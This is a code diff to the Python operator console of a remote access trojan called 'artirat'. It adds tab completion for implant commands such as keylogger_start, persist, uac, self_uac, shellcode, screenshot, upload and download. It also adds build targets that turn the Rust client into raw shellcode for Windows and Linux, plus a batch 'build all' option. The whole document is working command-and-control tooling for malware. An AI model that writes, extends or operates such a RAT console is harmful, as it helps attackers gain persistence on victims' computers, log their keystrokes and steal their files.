@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import atexit
 import base64
+import glob as globmod
 import os
 import readline
 import socket
@@ -149,16 +150,72 @@ def parse_file_response(out):
             pass
     return None, None
 
+CLIENT_COMMANDS = [
+    "help", "/h", "/?",
+    "cd",
+    "screenshot",
+    "upload",
+    "download",
+    "shellcode",
+    "uac",
+    "persist",
+    "self_move",
+    "check_elevated",
+    "self_uac",
+    "portscan",
+    "keylogger_start",
+    "keylogger_stop",
+    "exit", "quit",
+    "background",
+]
+
+FILE_CMDS = {"download", "shellcode"}
+
+
+def _interactive_completer(text, state):
+    line = readline.get_line_buffer()
+    parts = line.split()
+    cmd = parts[0].strip() if parts else ""
+    if cmd in FILE_CMDS:
+        dirname = os.path.dirname(text) or "."
+        basename = os.path.basename(text)
+        try:
+            entries = sorted(os.listdir(dirname))
+        except OSError:
+            entries = []
+        matches = []
+        for e in entries:
+            if not e.startswith(basename):
+                continue
+            full = os.path.join(dirname, e)
+            suffix = "/" if os.path.isdir(full) else " "
+            display = e if dirname == "." else os.path.join(dirname, e)
+            matches.append(display + suffix)
+        if state < len(matches):
+            return matches[state]
+        return None
+    if not parts or (len(parts) == 1 and not line.endswith(" ")):
+        matches = [c for c in CLIENT_COMMANDS if c.startswith(text)]
+        if state < len(matches):
+            return matches[state]
+    return None
+
+
 def interactive_session(conn, addr, cid: int, read_initial=True):
+    old_completer = readline.get_completer()
+    old_delims = readline.get_completer_delims()
+    readline.set_completer(_interactive_completer)
+    readline.set_completer_delims(" \t\n")
+    readline.parse_and_bind("tab: complete")
     prompt = ">> "
     if read_initial:
         try:
             initial = recv_until_prompt(conn, prompt.encode(), timeout=30)
         except KeyboardInterrupt:
             print()
-            return "background"
+            return _restore_completer("background", old_completer, old_delims)
         if initial is None:
-            return "exit"
+            return _restore_completer("exit", old_completer, old_delims)
         init_text = initial.decode(errors="ignore")
         extract_keylog_lines(cid, init_text)
         print(init_text, end="", flush=True)
@@ -167,7 +224,7 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
             line = input(prompt)
         except (EOFError, KeyboardInterrupt):
             print()
-            return "background"
+            return _restore_completer("background", old_completer, old_delims)
         if not line:
             continue
         line = line.strip()
@@ -177,9 +234,9 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
             except Exception:
                 pass
             time.sleep(0.3)
-            return "exit"
+            return _restore_completer("exit", old_completer, old_delims)
         if line == "background":
-            return "background"
+            return _restore_completer("background", old_completer, old_delims)
         try:
             if line.startswith("download "):
                 parts = line.split(" ", 1)
@@ -211,12 +268,12 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
                 response = recv_until_prompt(conn, prompt.encode())
             except KeyboardInterrupt:
                 print()
-                return "background"
+                return _restore_completer("background", old_completer, old_delims)
             finally:
                 conn.settimeout(None)
             if response is None:
                 print("[Connection lost]")
-                return "exit"
+                return _restore_completer("exit", old_completer, old_delims)
             out = response.decode(errors="ignore")
             extract_keylog_lines(cid, out)
             if out.endswith(prompt):
@@ -230,9 +287,17 @@ def interactive_session(conn, addr, cid: int, read_initial=True):
             print(out, end="", flush=True)
         except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
             print("\n[Connection lost]")
-            return "exit"
+            return _restore_completer("exit", old_completer, old_delims)
         except Exception as e:
             print(f"Error: {e}")
+
+
+def _restore_completer(result, old_completer, old_delims):
+    if old_completer:
+        readline.set_completer(old_completer)
+    if old_delims:
+        readline.set_completer_delims(old_delims)
+    return result
 
 
 def multi_run(manager: ClientManager, cmdline: str, timeout=15):
@@ -319,7 +384,36 @@ def multi_run(manager: ClientManager, cmdline: str, timeout=15):
         print(out, end="")
 
 
-def build_client(target: str):
+ALL_BUILD_TARGETS = [
+    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
+    "dll-windows", "dll-linux",
+    "windows-shellcode", "windows32-shellcode", "linux-shellcode", "linux32-shellcode",
+]
+EXE_BUILD_TARGETS = [
+    "windows", "linux", "linux-musl", "linux32", "windows32", "android",
+]
+
+
+def _stream_cargo(cmd, cwd, env, quiet=False):
+    if quiet:
+        r = subprocess.run(cmd, cwd=cwd, env=env, capture_output=True, text=True)
+        if r.stdout:
+            print(r.stdout)
+        if r.stderr:
+            print(r.stderr, file=sys.stderr)
+        return r.returncode
+    process = subprocess.Popen(
+        cmd, cwd=cwd, env=env,
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        text=True, bufsize=1,
+    )
+    for line in process.stdout:
+        print(line, end="", flush=True)
+    process.wait()
+    return process.returncode
+
+
+def build_client(target: str, quiet=False):
     targets = {
         "windows": "x86_64-pc-windows-gnu",
         "linux": "x86_64-unknown-linux-gnu",
@@ -329,37 +423,59 @@ def build_client(target: str):
         "windows32": "i686-pc-windows-gnu",
         "dll-windows": "x86_64-pc-windows-gnu",
         "dll-linux": "x86_64-unknown-linux-gnu",
+        "windows-shellcode": "x86_64-pc-windows-gnu",
+        "windows32-shellcode": "i686-pc-windows-gnu",
+        "linux-shellcode": "x86_64-unknown-linux-musl",
+        "linux32-shellcode": "i686-unknown-linux-gnu",
     }
     t = targets.get(target, target)
+    is_shellcode = target.endswith("-shellcode")
     is_dll = target.startswith("dll-")
-    print(f"[*] Building {'DLL/SO' if is_dll else 'EXE'} for {t} (this may take a while)...")
+    kind = "SHELLCODE" if is_shellcode else ("DLL/SO" if is_dll else "EXE")
+    print(f"[*] Building {kind} for {t} (this may take a while)...")
     env = os.environ.copy()
     if target == "android" or t == "aarch64-linux-android":
         env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"
 
-    # Static linking via RUSTFLAGS for standalone executables
     rustflags = env.get("RUSTFLAGS", "")
+    is_windows = "windows" in target
     if is_dll:
         cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
     else:
-        rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
+        if not is_windows:
+            rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
         cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]
     if rustflags:
         env["RUSTFLAGS"] = rustflags
 
-    r = subprocess.run(
-        cmd,
-        cwd=os.path.join(".", "artirat-client"),
-        env=env, capture_output=True, text=True
-    )
-    if r.stdout:
-        print(r.stdout)
-    if r.stderr:
-        print(r.stderr, file=sys.stderr)
-    if r.returncode == 0:
-        print(f"[+] Build succeeded for {t}")
+    rc = _stream_cargo(cmd, os.path.join(".", "artirat-client"), env, quiet)
+    if rc != 0:
+        print(f"[-] Build failed for {t} (exit code {rc})")
+        return False
+
+    if is_shellcode:
+        src_name = "artirat_client" + (".exe" if "windows" in target else "")
+        src_path = os.path.join(".", "artirat-client", "target", t, "release", src_name)
+        out_name = f"artirat_client_{target}.bin"
+        out_path = os.path.join(".", out_name)
+        objcopy = "objcopy"
+        if "windows" in target:
+            objcopy = "x86_64-w64-mingw32-objcopy" if "32" not in target else "i686-w64-mingw32-objcopy"
+        try:
+            subprocess.run(
+                [objcopy, "-O", "binary", src_path, out_path],
+                capture_output=True, text=True, check=True
+            )
+            size = os.path.getsize(out_path)
+            print(f"[+] Shellcode written to {out_name} ({size} bytes)")
+        except FileNotFoundError:
+            print(f"[-] {objcopy} not found — raw binary at {src_path} (not converted)")
+            print(f"    Manually run: objcopy -O binary '{src_path}' '{out_name}'")
+        except subprocess.CalledProcessError as e:
+            print(f"[-] objcopy failed: {e.stderr or e}")
     else:
-        print(f"[-] Build failed for {t} (exit code {r.returncode})")
+        print(f"[+] Build succeeded for {t}")
+    return True
 
 
 def setup_readline(completer):
@@ -392,7 +508,7 @@ def c2_completer(text, state, manager=None):
             candidates = [str(i) for i in ids]
             return candidates[state] if state < len(candidates) else None
         if cmd == "build":
-            candidates = ["linux", "windows", "linux-musl", "linux32", "windows32", "android", "dll-windows", "dll-linux"]
+            candidates = ["all"] + ALL_BUILD_TARGETS
             return candidates[state] if state < len(candidates) else None
         return None
     if cmd in CMD2 and len(parts) == 2:
@@ -402,7 +518,7 @@ def c2_completer(text, state, manager=None):
             candidates = [str(i) for i in ids if str(i).startswith(arg)]
             return candidates[state] if state < len(candidates) else None
         if cmd == "build":
-            candidates = [t for t in ("linux", "windows", "linux-musl", "linux32", "windows32", "android", "dll-windows", "dll-linux") if t.startswith(arg)]
+            candidates = [t for t in (["all"] + ALL_BUILD_TARGETS) if t.startswith(arg)]
             return candidates[state] if state < len(candidates) else None
     return None
 
@@ -467,10 +583,21 @@ def c2_menu(manager: ClientManager):
                 print(f"[Backgrounded session with client {cid}]")
         elif cmd == "build":
             if len(parts) < 2:
-                print("Usage: build <target>")
-                print("Targets: windows, linux, linux-musl, linux32, windows32, android, dll-windows, dll-linux")
+                print("Usage: build <target> [--quiet]")
+                print("       build all [--quiet]")
+                print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                 continue
-            build_client(parts[1])
+            quiet = "--quiet" in parts
+            target_arg = parts[1]
+            if target_arg == "all":
+                targets = EXE_BUILD_TARGETS
+                for t in targets:
+                    print(f"\n{'='*60}")
+                    build_client(t, quiet=quiet)
+                print(f"\n{'='*60}")
+                print("[+] All builds finished")
+            else:
+                build_client(target_arg, quiet=quiet)
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
